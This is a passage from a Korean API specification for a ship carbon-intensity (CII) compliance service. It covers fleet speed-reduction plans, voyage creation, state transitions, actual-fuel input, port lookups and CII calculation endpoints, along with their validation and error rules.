| `adjustments[]` | list | N | `speed_reduction_percent` 0~50 | 선박별 감속률(%). **목록에 없는 선박은 0%** · 모르는 선박이면 422 · **같은 선박이 두 번 오면 422**(`#1070` ⑶ — 받아 주면 계산은 마지막 값으로 하고 저장본에는 두 값이 다 남아, 다시 연 계획이 어느 감속률이었는지 답할 수 없다) |
| `prices.charter_usd_per_day` | map | N | 0 이상 | 선박 ID → 일일 용선료(USD). **계획의 가정값**. 키는 **UUID 표준 표기(소문자)로 정규화**해 받으므로 대문자로 보내도 같은 선박이다 · UUID가 아니면 422 · 정규화 후 같은 선박이 두 번이면 422 (`#1070` ⑵) |
| `prices.fuel_usd_per_ton` | map | N | 0 이상 | 유종 코드 → 연료 단가(USD/t) |

#### 응답 (200 OK)

```json
{
  "data": {
    "regulation_year": 2026,
    "target": "ALL_C_OR_BETTER",
    "target_met": false,
    "vessels": [
      {
        "vessel_id": "00000000-0000-4000-8000-000000000001",
        "vessel_name": "샘플 벌크선 (50,000 DWT)",
        "speed_reduction_percent": "10.0",
        "unavailable_reason": null,
        "before": { "attained_cii": "8.9711", "rating": "E" },
        "after": { "attained_cii": "8.0909", "rating": "E" },
        "target_rating": "C",
        "meets_target": false,
        "extra_days": "1.52",
        "fuel_saved_ton": "125.78",
        "skipped_voyages": 0,
        "remaining_voyage_count": 2,
        "required_cut_fuel_ton": "392.01",
        "achievable": true
      }
    ],
    "rating_distribution": {
      "before": { "A": 0, "B": 1, "C": 1, "D": 1, "E": 1 },
      "after": { "A": 0, "B": 1, "C": 1, "D": 1, "E": 1 }
    },
    "costs": {
      "currency": "USD",
      "extra_days": "1.52",
      "charter_loss": "22817.46",
      "fuel_saving": "75468.00",
      "net": "52650.54",
      "fuel_saved_ton_by_type": { "HFO": "125.78" },
      "missing_charter_rates": [],
      "missing_fuel_prices": []
    },
    "warnings": []
  },
  "meta": { "request_id": "…", "timestamp": "…" }
}
```

| 필드 | 설명 |
|---|---|
| `target_met` | 계산할 수 있는 모든 선박이 조정 후 목표 이상이면 `true`. **계산할 수 있는 선박이 0척이면 `null`** |
| `vessels[].unavailable_reason` | 계산하지 못한 선박 — `§2.8`과 같은 어휘. 이때 `before` 이하 필드가 없다 |
| `vessels[].before` | **`§6.1` 결정론 연말 예상과 같은 값**(같은 입력 조립) |
| `vessels[].target_rating` | 그 선박이 넘지 말아야 할 등급 — `NO_AT_RISK`면 D, 직전 2개 연도 확정 D면 C |
| `vessels[].skipped_voyages` | 기준 속력·기준 일일 연료가 없어 **감속을 적용하지 못한** 잔여 항차 수 — 0보다 크면 `warnings`에 `SLOWDOWN_SKIPPED_NO_SPEED_MODEL` |
| `vessels[].remaining_voyage_count` | **스냅샷의 잔여 계획(PLAN) 항차 수** — `§6.1` `deterministic.remaining_voyage_count`와 **같은 기준**이다(`#1070` ⑷). 계산에서 뺀 항차가 있어도 이 수는 줄지 않는다. 무엇을 뺐는지는 `warnings`가 말한다 — 종전에는 제외 **후** 개수를 실어, 같은 선박·같은 연도인데 연간 등급 관리 화면과 항차 수가 달랐다 |
| `vessels[].required_cut_fuel_ton` · `achievable` | 조정 **후**에도 남는 필요 감축량(`§6.1.1` · `PRD §12.3.1`). 잔여 계획이 없으면 `null` |
| `costs.charter_loss` · `fuel_saving` · `net` | **필요한 단가가 하나라도 없으면 `null`** — 0으로 채우지 않는다. 무엇이 비었는지는 `missing_charter_rates`(선박 ID) · `missing_fuel_prices`(유종) |
| `warnings` | 선대 전체에 한 번씩만 싣는 경고(`§1.6`). `SLOWDOWN_SKIPPED_NO_SPEED_MODEL`(감속 미적용 항차 있음) · `SIMULATION_PLAN_NO_FUEL`(연료 정보가 없어 연말 예상에서 뺀 계획 항차 있음 — `#812`·`#1070` ⑷). **입력 조립이 낸 경고를 버리지 않는다** |

#### 2.17.2 저장

```http
POST /api/v1/fleet/reduction-plans
```

§2.17.1 본문 + `plan_name`(**앞뒤 공백을 걷고** 1~100자 — 공백만 있는 이름은 **422**다. `name`이 아닌 이유는 필드 라벨이 필드명 하나로 매겨지는데 `name`이 이미 「선명」이라서다. 종전에는 공백만 있는 이름이 검증을 통과해 선대 전체 계산을 한 번 돌린 뒤 DB 제약 `chk_fleet_reduction_plan_name`에 걸려 **500**이 났다 — `#1070` ⑴). **서버가 다시 계산해** 결과까지 저장하고 **201**에 저장본을 돌려준다 — 화면이 보낸 결과를 받지 않는다.

```json
{
  "data": {
    "plan_id": "…",
    "plan_name": "9월 감속안",
    "regulation_year": 2026,
    "target": "ALL_C_OR_BETTER",
    "adjustments": [ … ],
    "prices": { … },
    "result": { "…": "§2.17.1 data와 같은 모양" },
    "created_at": "2026-09-13T14:00:00+00:00"
  },
  "meta": { "request_id": "…", "timestamp": "…" }
}
```

#### 2.17.3 목록

```http
GET /api/v1/fleet/reduction-plans
```

최근 저장순. **`§1.5` 커서 페이지네이션**(`limit` 기본 20 · 최대 100 · `cursor`)을 쓰며 `meta`에 `next_cursor`·`has_more`가 들어간다 (`#1367`). 각 항목은 §2.17.2의 `data`에서 **`result`를 뺀** 모양이다 — 목록에는 무거워서다. 화면은 첫 항목의 `prices`를 새 계획의 기본값으로 쓴다.

> **종전에는 20건에서 자르면서 그 사실을 응답이 말하지 않았다** (`#1367`). 21번째 계획을 볼 방법이 없었고, 화면에서는 **「계획이 20개뿐」과 구분되지 않았다** — `#1076`이 계산 이력(`§1.9`)에서 고친 것과 같은 형태다.

#### 2.17.4 단건

```http
GET /api/v1/fleet/reduction-plans/{plan_id}
```

§2.17.2의 `data` 그대로. ⚠️ **`result`는 저장 시점의 값이다 — 다시 계산하지 않는다.** 그 사이 항차가 바뀌었어도 보고한 숫자를 그대로 돌려준다.

#### 오류

| Status | Code | 조건 |
|---|---|---|
| 404 | `NOT_FOUND` | §2.17.4 — 없는 계획 |
| 422 | `VALIDATION_ERROR` | 감속률 0~50 밖 · 모르는 `target` · 모르는 선박 · 음수 단가 · `plan_name` 누락 |
| 403 | `CSRF_ERROR` | §2.17.1·§2.17.2 — `X-CSRF-Token` 누락·불일치(`§1.4`) |

---

## 3. Voyage API

### 3.1 항차 목록 조회

```http
GET /api/v1/vessels/{vessel_id}/voyages?status=PLANNED&limit=20
```

> **[ORACLE-MISS-3 주의]** MVP에서는 선박별 항차 조회만 지원한다. 전체 선박의 항차를 통합 조회하는 글로벌 엔드포인트(`GET /api/v1/voyages`)는 MVP 범위 외이다. 대시보드는 **`§2.8` `GET /fleet/summary` 한 번으로** 선대 현황을 받는다(`#350`) — 종전 「클라이언트에서 다중 선박 조회 후 병합한다」는 그 엔드포인트가 생기기 전의 서술이었다(`#759` 정정).

#### 쿼리 파라미터

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `status` | string | N | 상태 필터 (DRAFT, PLANNED, IN_PROGRESS, COMPLETED, CONFIRMED, CANCELLED, ARCHIVED) |
| `regulation_year` | int | N | 기준연도 필터 |
| `annual_inclusion_policy` | string | N | EXCLUDE, INCLUDE_AS_PLAN, INCLUDE_AS_ACTUAL |
| `limit` | int | N | 페이지 크기 |
| `cursor` | string | N | 페이지네이션 커서 |

> **[#1332] 값이 틀린 필터는 빈 목록이 아니라 422다.** `status`·`annual_inclusion_policy`가 위 열거값 밖이면 `VALIDATION_ERROR`를 낸다(`field_label`은 「상태」·「연간 반영 정책」). ⚠️ **빈 목록은 답이 아니다** — 오타를 내면 맞는 행이 없어 200 + 빈 배열이 돌아오고, 화면에서는 **「그런 항차가 없다」와 같은 모양**이 된다. 선박 목록(`§2.1`)의 `ship_type`은 처음부터 422였다.
>
> **`annual_inclusion_policy` 필터는 이 표에만 있고 구현되지 않았다** (`#1332` 정정). 라우트가 선언하지 않은 쿼리를 FastAPI는 오류 없이 버리므로, 문서대로 보낸 호출자는 **필터가 걸린 줄 알고 전체 목록**을 받았다.
>
> **없는 선박·삭제된 선박은 404다** — 종전에는 목록이 돌아와 `GET /vessels/{id}`(404)와 어긋났다.

#### 응답 (200 OK)

```json
{
  "data": [
    {
      "id": "uuid",
      "vessel_id": "uuid",
      "voyage_no": "V-2026-001",
      "status": "PLANNED",
      "departure_port_name": "Busan",
      "departure_lat": 35.0833,
      "departure_lon": 129.0,
      "arrival_port_name": "Rotterdam",
      "arrival_lat": 51.9244,
      "arrival_lon": 4.4778,
      "planned_distance_nm": 11000.0,
      "planned_distance_source": "USER_INPUT",
      "actual_distance_nm": null,
      "planned_speed_kn": 14.0,
      "actual_avg_speed_kn": null,
      "planned_departure_at": "2026-07-15T00:00:00Z",
      "planned_arrival_at": "2026-08-12T00:00:00Z",
      "actual_departure_at": null,
      "actual_arrival_at": null,
      "annual_inclusion_policy": "INCLUDE_AS_PLAN",
      "regulation_year": 2026,
      "created_from": "MANUAL",
      "fuel_uses": [
        {
          "id": "uuid",
          "fuel_type": "HFO",
          "planned_fuel_ton": 800.0,
          "actual_fuel_ton": null,
          "cf_used": 3.114,
          "source": "USER_INPUT"
        }
      ],
      "notes": null,
      "created_at": "2026-07-01T00:00:00Z"
    }
  ],
  "meta": { ... }
}
```

### 3.2 항차 상세 조회

```http
GET /api/v1/voyages/{voyage_id}
```

#### 응답 (200 OK)

§3.1의 단일 항차 객체와 동일.

### 3.3 항차 생성

```http
POST /api/v1/vessels/{vessel_id}/voyages
```

#### 요청 Body

```json
{
  "voyage_no": "V-2026-001",
  "departure_port_name": "Busan",
  "departure_lat": 35.0833,
  "departure_lon": 129.0,
  "arrival_port_name": "Rotterdam",
  "arrival_lat": 51.9244,
  "arrival_lon": 4.4778,
  "planned_distance_nm": 11000.0,
  "planned_distance_source": "USER_INPUT",
  "planned_speed_kn": 14.0,
  "planned_departure_at": "2026-07-15T00:00:00Z",
  "planned_arrival_at": "2026-08-12T00:00:00Z",
  "regulation_year": 2026,
  "fuel_uses": [
    {
      "fuel_type": "HFO",
      "planned_fuel_ton": 800.0,
      "source": "USER_INPUT"
    }
  ],
  "notes": "정기 항차"
}
```

> **[#1256] `planned_distance_source`는 선택이며 「그 숫자가 어디서 왔나」다.** `USER_INPUT`(사용자가 직접 넣은 값)과 `COORDINATE_ESTIMATE`(`§3.9`의 대권거리로 채운 값 · `PRD §15.2` 「좌표 기반 추정 거리」) 둘만 받고, 그 밖은 422(`field_label` 「계획 거리 출처」)다. **생략하면 `null` = 「모른다」로 저장한다** — 서버는 호출자가 그 숫자를 어떻게 얻었는지 알 수 없으므로 직접 입력이라고도 추정이라고도 적지 않는다(`PRD §0.3`). 화면(`VoyagePanel`)은 항상 보낸다 — 좌표로 채운 뒤 손대지 않았으면 `COORDINATE_ESTIMATE`, 고쳤으면 `USER_INPUT`. CSV 가져오기(`§8.2`)는 `USER_INPUT`이다(좌표 열이 없으니 추정일 수 없다 · 경로는 `created_from = IMPORT`가 답한다). 시나리오 채택(`§5.2`)은 `null`이다 — 시나리오 행에는 직항 거리가 좌표 추정이었는지가 남아 있지 않다. 화면은 `COORDINATE_ESTIMATE`일 때만 추정 표시를 붙이고 `null`에는 아무것도 붙이지 않는다. `created_from`과 다른 축이다 — 그쪽은 「이 항차가 어느 경로로 들어왔나」다.

> **[#1348] 문자열 길이 상한.** 항만명(`departure_port_name`·`arrival_port_name`)은 **1~200자**, `voyage_no`는 **~100자**, `notes`는 **~1000자**다. 앞 둘은 DB 컬럼 폭(`DB_SCHEMA §8.2`)에서 오고, `notes`는 **`PRD §10.2` ⑵가 정한 값**이다 — DB는 `TEXT`라 컬럼은 더 받지만 **받는 것과 받아도 되는 것은 다르다.** 상한이 없는 동안에는 요청 본문 크기가 유일한 방어였다.

> **[EXT-P0-4]** `annual_inclusion_policy`는 요청 본문에서 제외했다. 생성 시 `status = DRAFT`이며, DRAFT에서는 `annual_inclusion_policy = EXCLUDE`만 허용된다(§3.5 제약 매트릭스 참조).
>
> **[#150 정정] `PLANNED` 전환이 곧 연간 반영은 아니다.** 종전 문장은 *"`PLANNED` 전환 시 `annual_inclusion_policy`를 `INCLUDE_AS_PLAN`으로 설정한다"* 였으나, `§3.5` 제약 매트릭스와 `PRD §8.1.2`는 `PLANNED`에서 **`EXCLUDE`와 `INCLUDE_AS_PLAN`을 모두 허용**한다. **계획 저장 여부와 연간 반영 여부는 별개다** — 연간 반영을 선택할 때만 `INCLUDE_AS_PLAN`을 지정한다. 종전 문장은 대표 경로 서술이었고 그대로 두면 「계획 저장 = 무조건 연간 반영」으로 읽힌다.

> **[#1332] 없는 선박·삭제된 선박은 404다.** 종전에는 `fk_voyage_vessel` 위반이 그대로 올라와 **500**이었고, **삭제된 선박에는 201로 항차가 생겼다** — `GET /vessels/{id}`는 404인데 이 경로는 통과해 **같은 리소스가 상태에 따라 있기도 없기도** 했다. CSV 가져오기(`§8.2`)도 같다: 종전에는 `dry_run`이 「전부 가능」이라 답한 뒤 실제 적재에서 **행마다 FK 실패**가 났다.

> **[#1332] VAL-005는 이 자리에서 409다.** 검증한다고 적혀 있었으나 **보는 자리가 없어** seed에 없는 연도(예: 2031)가 **201로 저장**됐고, `INCLUDE_AS_PLAN` 전환까지 통과한 뒤 **CII 조회에서 409**가 나 사용자는 서버 문제로 읽었다. 고칠 수 있는 입력이라면 **입력받는 자리에서** 말한다. `§3.4` 수정 경로도 같다 — 한쪽만 막으면 「만들 때는 안 되는데 고칠 때는 되는」 상태가 된다.

> **[#150] `regulation_year`는 optional이다.** 주어지면 `VAL-005`(`regulation_year` 테이블에 해당 연도 존재)로 검증한다. `annual_inclusion_policy = EXCLUDE`인 동안에는 없어도 되고, **`INCLUDE_AS_PLAN` 전환 시점에는 반드시 있어야 한다**(§3.5 전환 가드 · `PRD §8.1.1`). 생성 시 넣지 않았다면 §3.4 PATCH로 설정한다.

#### 응답 (201 Created)

생성된 항차 객체. 초기 `status = DRAFT`, `annual_inclusion_policy = EXCLUDE` (자동 설정).

### 3.4 항차 수정

```http
PATCH /api/v1/voyages/{voyage_id}
```

모든 필드는 optional. `status` 변경은 §3.5 참조. **생략 = 변경 없음, 명시적 `null` = 클리어**다(#312).

> **[#150]** 대상 필드는 §3.3 요청 본문과 같으므로 **`regulation_year`도 여기서 설정·변경한다.** 주어지면 `VAL-005`로 검증한다. `annual_inclusion_policy ≠ EXCLUDE`인 항차에서 `regulation_year`를 `null`로 지우는 요청은 `DB_SCHEMA`의 `chk_year_policy`를 깨뜨리므로 거부한다.

> **[#1256] `planned_distance_nm`을 바꾸면서 `planned_distance_source`를 생략하면 출처는 `null`(「모른다」)로 돌아간다.** 출처는 항차가 아니라 **숫자에 붙은 표시**다 — 좌표로 채운 항차(`COORDINATE_ESTIMATE`)의 거리를 사람이 고쳤는데 「추정값입니다」가 남아 있으면 `PRD §0.3`이 금하는 거짓말이고, 서버는 새 숫자를 어떻게 얻었는지 모르므로 직접 입력이라고도 적지 않는다(§3.3 생성 기본값과 같은 규칙). 거리와 출처를 **함께** 보내면 그 출처가 붙고, 출처만 보내면(거리 생략) 표시만 바뀌며, 명시적 `null`은 지움이다(#312 규약). 거리를 건드리지 않는 요청은 출처를 그대로 둔다. 시나리오 채택(`§5.2` `UPDATE_EXISTING_PLAN`)도 거리를 갈아 끼우므로 같은 규칙으로 `null`이 된다. **출처 변경은 거리와 같은 상태(`DRAFT`·`PLANNED`)에서만 된다** — 재계산 대상은 아니지만 계획 거리에 붙은 표시라, 확정된 항차의 거리에 사후로 「추정」을 붙이거나 떼면 `422 STATE_TRANSITION_ERROR`다(`#865` 가드와 같은 문구).

### 3.5 항차 상태 전환

```http
POST /api/v1/voyages/{voyage_id}/transition
```

#### 요청 Body

```json
{
  "to_status": "PLANNED",
  "annual_inclusion_policy": "INCLUDE_AS_PLAN"
}
```

#### 상태 전환 규칙

> PRD §8.1.1, §8.1.2 기준.

| 전환 | 가드 조건 | 실패 시 |
|---|---|---|
| DRAFT → PLANNED | — | — |
| PLANNED → IN_PROGRESS | — | — |
| IN_PROGRESS → COMPLETED | 최소 1개 `actual_fuel_ton > 0` (ORACLE-C-4) | 422: 실적 입력 요청 |
| COMPLETED → CONFIRMED | 모든 `actual_fuel_ton > 0` 및 `actual_distance_nm > 0` | 422: 누락 실적 입력 요청 |
| CONFIRMED → COMPLETED | audit log 필수 (오류 정정 목적만) | 재확인 다이얼로그 표시 |
| CONFIRMED → ARCHIVED | audit log 필수. regulation_year < current_year 또는 수동 | — |
| DRAFT → CANCELLED | — | — (`#1328` 등재 — 아래 각주) |
| PLANNED → CANCELLED | — | — |
| IN_PROGRESS → CANCELLED | — | — |
| `annual_inclusion_policy`를 `INCLUDE_AS_PLAN` · `INCLUDE_AS_ACTUAL`로 지정하는 모든 전환 | `voyage.regulation_year != null` (#150) | 422 `STATE_TRANSITION_ERROR`: 기준연도 설정 요청 |

> **[#1328] `DRAFT → CANCELLED`가 이 표에 없었다.** 구현(`services/voyage._TRANSITIONS`)과 **화면**(`frontend/src/features/voyage-management/voyageRules.ts`)이 처음부터 열어 두었으므로, 문서를 보고 만든 클라이언트·검사는 **422를 기대**했다. **코드에서 닫는 쪽은 성립하지 않는다** — 화면이 이미 제공하는 동작을 없애는 일이다. `§3.7`상 취소된 DRAFT는 hard delete 가능이라 데이터가 남지도 않는다.
>
> **[#1328] 위 두 「audit log 필수」가 실제로 기록된다.** 종전에는 코드가 `TECH_SPEC §13.1`(「항차 확정」 하나)만 근거로 삼아 **확정만** 남겼다 — **확정된 실적을 되돌려 고친 뒤 다시 확정하면** 로그에 「확정」 두 건만 남고 **누가 언제 되돌렸는지**가 사라졌다. 액션 값은 `VOYAGE_TRANSITION`(`DB_SCHEMA §2.14`)이며, `AGENTS §3.1`상 `PRD` > `TECH_SPEC`이라 코드와 `TECH_SPEC`을 상위 정본에 맞췄다.

> **[ORACLE-C-4 추가]** `CONFIRMED → ARCHIVED` 전환을 추가했다. PRD §8.1 상태 다이어그램에 명시된 전환이다. 보관된 항차는 읽기 전용이며 `annual_inclusion_policy = EXCLUDE`로 자동 설정된다.
>
> **[#150] 마지막 행은 상태가 아니라 policy에 걸리는 가드다.** `DB_SCHEMA`의 `chk_year_policy`(`annual_inclusion_policy = 'EXCLUDE' OR regulation_year IS NOT NULL`)에 **도달해 우연히 실패하는 것이 아니라, 공개 API가 전환 전에 거부한다.** 값은 §3.3 생성 또는 §3.4 PATCH로 설정하며 **전환 요청 본문에서는 받지 않는다** — `regulation_year`는 전환 명령의 옵션이 아니라 Voyage 도메인 데이터이기 때문이다. §3.1이 이미 목록 필터로 쓰고 있는 것도 같은 성격을 보여준다.

#### status × annual_inclusion_policy 제약

> PRD §8.1.2 (ORACLE-R-1).

전환 요청에서 `annual_inclusion_policy`를 **생략하면 현행 값을 유지한다**(#310). 단, 아래 두 경우는 예외다.

- 목표 상태가 EXCLUDE only(`CANCELLED`·`ARCHIVED`)면 **자동으로 `EXCLUDE`로 설정**한다(아래 표 「자동 설정」·ORACLE-C-4).
- 목표 상태가 현행 policy를 허용하지 않는 조합(예: `PLANNED`(`INCLUDE_AS_PLAN`) → `COMPLETED`)이면 자동 보정하지 않고 **명시적 재지정을 요구하며 거부한다(422)**.

| status | 허용 policy |
|---|---|
| DRAFT | EXCLUDE only (자동 설정) |
| PLANNED | EXCLUDE, INCLUDE_AS_PLAN |
| IN_PROGRESS | EXCLUDE, INCLUDE_AS_PLAN |
| COMPLETED | EXCLUDE, INCLUDE_AS_ACTUAL |
| CONFIRMED | EXCLUDE, INCLUDE_AS_ACTUAL |
| CANCELLED | EXCLUDE only (자동 설정) |
| ARCHIVED | EXCLUDE only (자동 설정) |

#### 응답 (200 OK)

**전환 후의 항차 객체 전체**다 — `§3.1`의 단일 항차 객체와 같은 모양(`fuel_uses` 포함)이며 아래는 요점만 적었다.

```json
{
  "data": {
    "id": "uuid",
    "status": "PLANNED",
    "annual_inclusion_policy": "INCLUDE_AS_PLAN",
    "...": "§3.1 항차 객체의 나머지 필드"
  },
  "meta": { ... }
}
```

> **[#830 정정]** 종전 예시는 세 필드만 보여 **응답이 그 셋뿐인 것처럼** 읽혔다. 구현은 항차 전체를 돌려준다(`services/voyage.py` `transition_voyage`).

#### 오류 (422)

```json
{
  "error": {
    "code": "STATE_TRANSITION_ERROR",
    "message": "실제 연료량을 한 건 이상 입력해야 「항해 완료」로 바꿀 수 있습니다.",
    "details": [],
    "request_id": "…"
  }
}
```

> **[#1329] 종전 예시는 실제 응답이 아니었다.** 영문 필드명(`actual_fuel_ton`)과 상태 코드 원문(`IN_PROGRESS → COMPLETED`)을 문장에 넣고 `details[].rule`에 `ORACLE-C-4`를 실었는데, 구현은 **한국어 한 문장에 `details`는 비어 있다**. `§1.3.2`의 언어 규정(`#999`)과 `rule`을 넣지 않는 규약(`error_handlers._validation_details` — *「Pydantic 오류에서 VAL 번호를 유도할 수 없고, 임의로 붙이면 근거 없는 규칙 번호가 응답에 실린다」*)이 모두 그 뒤에 정해졌고 **이 예시만 남아 있었다.**

### 3.6 항차 실적 입력

```http
PUT /api/v1/voyages/{voyage_id}/actuals
```

#### 요청 Body

```json
{
  "actual_distance_nm": 11200.0,
  "actual_avg_speed_kn": 13.5,
  "actual_departure_at": "2026-07-15T08:00:00Z",
  "actual_arrival_at": "2026-08-13T12:00:00Z",
  "fuel_uses": [
    {
      "fuel_type": "HFO",
      "actual_fuel_ton": 850.0,
      "source": "USER_INPUT"
    }
  ]
}
```

모든 필드가 선택이다 — **실거리만 먼저 알고 연료는 나중에 오는 경우가 실제로 있다.** 생략은 「변경 없음」이다.

#### 상태별 허용 (#440)

| status | 실적 입력 | 이유 |
|---|---|---|
| `IN_PROGRESS` · `COMPLETED` | **허용** | |
| `DRAFT` · `PLANNED` | 422 `STATE_TRANSITION_ERROR` | **아직 뜨지 않은 항차에 실적이 있을 수 없다.** 받아 두면 `PRD §8.3` 값 우선순위가 「PLANNED인데 actual이 있는」 정의되지 않은 상태를 만난다 |
| `CONFIRMED` | 422 `STATE_TRANSITION_ERROR` | **확정된 실적을 조용히 갈아 끼우지 않는다.** 연말 DCS 보고의 근거이므로 고치려면 `COMPLETED`로 되돌리는 전환을 명시적으로 거친다 |
| `CANCELLED` · `ARCHIVED` | 422 `STATE_TRANSITION_ERROR` | 종결된 기록 |

#### 계획값을 지우지 않는다

`PRD §8.4` — *"실제 연료 사용량 입력: 계획값과 실제값을 **모두 보존**하고 실제값 우선 사용"*. 요청 본문에 `planned_fuel_ton`이 **없는 이유**다. 계획 대비 실적 차이가 `#363` 피드백 루프의 입력이므로, 계획값을 잃으면 그 비교가 영영 불가능해진다.

같은 이유로 **`calculation_run`을 무효화하지 않는다.** `§8.4`가 무효화를 규정한 것은 「항차 계획 변경」이지 실적 입력이 아니며, 실적은 다음 조회 때 값 우선순위가 자동으로 집어 간다.

#### CF snapshot

기존 연료 행의 `cf_used`는 **그대로 둔다**(`#378`). 실적을 나중에 입력했다고 그때의 CF로 과거 계산이 바뀌면 재현성이 깨진다. 새로 생기는 행에만 현재 CF를 박는다.

#### 오류 응답

| 상태 | 코드 | 조건 |
|---|---|---|
| 404 | `NOT_FOUND` | 항차 없음 |
| 422 | `STATE_TRANSITION_ERROR` | 위 표의 상태 |
| 422 | `VALIDATION_ERROR` | 같은 `fuel_type`이 두 번 (`idx_fuel_use_unique` — 중복은 **CO₂ 이중 산정**이 된다) · 알 수 없는 `fuel_type` · `actual_fuel_ton <= 0` · `actual_avg_speed_kn < 1.0` |

#### 응답 (200 OK)

수정된 항차 객체. `status`는 변경하지 않는다 (별도 transition 호출 필요).

> **왜 상태를 함께 바꾸지 않는가.** 실적 입력과 전환을 한 요청에서 처리하면 `PRD §8.1.1` 전환 가드를 우회하는 경로가 생긴다 — `COMPLETED → CONFIRMED`는 모든 실적이 채워졌을 때만 허용되는데, 같은 요청 안에서 채우고 전환하면 **그 검사가 자기 입력을 보고 통과한다.**

### 3.7 항차 삭제

> **[ORACLE-S-6 추가]**

```http
DELETE /api/v1/voyages/{voyage_id}
```

#### 삭제 규칙

| 현재 status | 처리 |
|---|---|
| DRAFT | Hard delete 허용 |
| CANCELLED | Hard delete 허용 |
| PLANNED, IN_PROGRESS | 422: 먼저 CANCELLED로 전환 필요 |
| COMPLETED, CONFIRMED, ARCHIVED | Soft delete only (감사 보존) |

> **[#313]** Hard delete 대상이라도 이 항차를 참조하는 계산 이력(`calculation_run`)이 있으면 **409 `CONFLICT`**로 거부한다. `fk_calculation_run_voyage`가 ON DELETE `RESTRICT`라 참조가 있는 물리 삭제는 DB 제약 위반이다 — 계산 이력은 보존 대상이다(DB_SCHEMA §7.1).

#### 응답 (200 OK)

```json
{
  "data": {
    "id": "uuid",
    "deleted": true,
    "hard_delete": true
  },
  "meta": { ... }
}
```

### 3.8 샘플 항만 목록 조회 (#760)

```http
GET /api/v1/ports/samples
```

항차 입력 화면이 **출발·도착항의 이름과 좌표를 채우는 출발점**이다(`PRD §15.1` 「샘플 항만 테이블」 MUST). 목록만 돌려준다 — 목록에 없는 항은 자유 입력이다(`PRD §20 O-11`).

#### 응답 (200 OK)

```json
{
  "data": [
    { "locode": "KRPUS", "name": "BUSAN", "name_ko": "부산", "country_code": "KR", "lat": 35.1, "lon": 129.0333 }
  ],
  "meta": { "request_id": "…", "timestamp": "…" }
}
```

| 필드 | 설명 |
|---|---|
| `locode` | 행 식별자. **World Port Index가 적은 UN/LOCODE 그대로**다 — 흔히 쓰는 코드와 다를 수 있다(싱가포르 `SGKEP`) |
| `name` | 항차에 **저장되는 항만명**(§3.3 `departure_port_name` · `arrival_port_name`). 데모 시드와 같은 대문자 영문 표기 |
| `name_ko` | 목록에 보이는 이름 |
| `lat` · `lon` | 좌표(도, 소수 4자리). 입력 보조 수치라 JSON 숫자다(§1.7) |

> **값은 NGA World Port Index(Pub. 150)에서 온다** — 미국 정부 저작물이라 공개 영역이다. 2026-09-12 조회값을 분 단위 원본 그대로 옮겼다. 데모 시드의 항차가 쓰는 항만 9곳을 **전부** 포함하고(검사가 대조한다) 주요 교역항을 더해 43곳이다. UN/LOCODE 목록(UNECE)은 데모 항만 중 가오슝·마닐라·하코다테에 좌표가 없어 쓰지 않았다.

### 3.9 좌표 기반 추정 거리 (#760)

```http
GET /api/v1/ports/great-circle?from_lat=35.1&from_lon=129.0333&to_lat=1.2833&to_lon=103.85
```

두 좌표의 대권거리(해리)다 — `PRD §15.2` 「좌표 기반 대권거리(거리 미입력 시 fallback)」. 항차의 계획 거리는 필수(§3.3)이므로, 화면이 이 값을 받아 **계획 거리 칸을 채우는 데** 쓴다. 계산식은 기능②의 DIRECT 거리와 **같은 함수**다(`TECH_SPEC §6`).

| 쿼리 | 설명 |
|---|---|
| `from_lat` · `from_lon` · `to_lat` · `to_lon` | 필수. 범위 밖이면 422 `VALIDATION_ERROR`(VAL-007) |

```json
{ "data": { "distance_nm": 2470.2, "method": "GREAT_CIRCLE" }, "meta": { … } }
```

> **추정값이다 — 실제 항로보다 짧다.** 운하·해협을 돌아가는 항로(상하이 → 로테르담 등)는 크게 짧게 나온다. 그래서 화면이 `좌표 기반 추정 거리`라고 표시하고(`PRD §15.2`), 사용자가 실제 항로거리를 넣으면 그것이 우선이다. 오차 방향은 `PRD §15.2` [#358] ①(거리 과소 → 등급이 실제보다 나쁘게)이다.

### 3.10 항만명 좌표 조회 (#768)

```http
GET /api/v1/ports/lookup?name=PORT%20KLANG
```

목록에 없는 항만의 좌표를 이름으로 찾는다 — `PRD §15.1`의 `MAY`(「Nominatim 등 무료 geocoding」)를 구현한 것이다. `§3.8` 샘플 목록에 있는 항은 그쪽이 먼저 답하므로 **외부로 나가지 않는다.**

| 쿼리 | 설명 |
|---|---|
| `name` | 필수. 2~200자. 항만명 |

```json
{
  "data": {
    "name": "PORT KLANG",
    "lat": 3.0,
    "lon": 101.4,
    "source": "LOOKUP",
    "display_name": "Port Klang, Selangor, Malaysia"
  },
  "meta": { … }
}
```

| `source` | 뜻 |
|---|---|
| `SAMPLE` | `§3.8` 샘플 목록(NGA World Port Index)에서 답했다. 외부 호출 없음 |
| `CACHE` | 전에 조회해 저장해 둔 값이다. 외부 호출 없음 |
| `LOOKUP` | 이번에 외부(Nominatim)에서 받았고 캐시에 담았다 |

> ⚠️ **입력 중에 부르면 안 된다.** 공개 Nominatim 사용 정책(`PRD §22` 참고문헌 11)이 **자동완성을 금지**하고 **초당 1회**를 상한으로 둔다. 화면은 사용자가 「좌표 찾기」를 눌렀을 때 **한 번** 부른다.
>
> **찾지 못하면 404**다. 세 경우를 문구로 가른다 — ⑴ 항만이 아니다(「부산」은 도시이기도 하다) ⑵ 조회 실패(바깥이 죽었다) ⑶ 조회를 쓸 수 없는 환경. **어느 쪽이든 항차 입력은 막히지 않는다**(`PRD §16.2` 오류 격리) — 사용자는 좌표를 직접 넣거나 좌표 없이 진행한다.
>
> **결과는 저장한다**(`DB_SCHEMA §2.20` `port_geocode`). 정책이 *"Results must be cached on your side"*로 **요구**한다.

---

## 4. Voyage CII Calculation API

### 4.1 항차 CII 추정 (기능①)

```http
POST /api/v1/calculations/voyage-cii
```

#### 요청 Body

```json
{
  "vessel_id": "uuid",
  "regulation_year": 2026,
  "distance_nm": 1000.0,
  "speed_kn": 12.0,
  "fuel_uses": [
    {
      "fuel_type": "HFO",
      "fuel_ton": 80.0
    }
  ],
  "weather_model": "NONE"
}
```

| 필드 | 타입 | 필수 | 검증 | 설명 |
|---|---|---|---|---|
| `vessel_id` | UUID | Y | 존재 확인 | 대상 선박 |
| `regulation_year` | int | Y | VAL-005: regulation_year 존재 | 등급 기준연도 |
| `distance_nm` | decimal | Y | VAL-002: > 0 | 항차 거리 |
| `speed_kn` | decimal | Y | VAL-009: ≥ 1.0 | 평균 예정 속도. **Layer 1 CII 계산에는 사용되지 않으며**, 항차 조건 표시 및 항차 저장 매핑을 위한 필수 입력이다 |
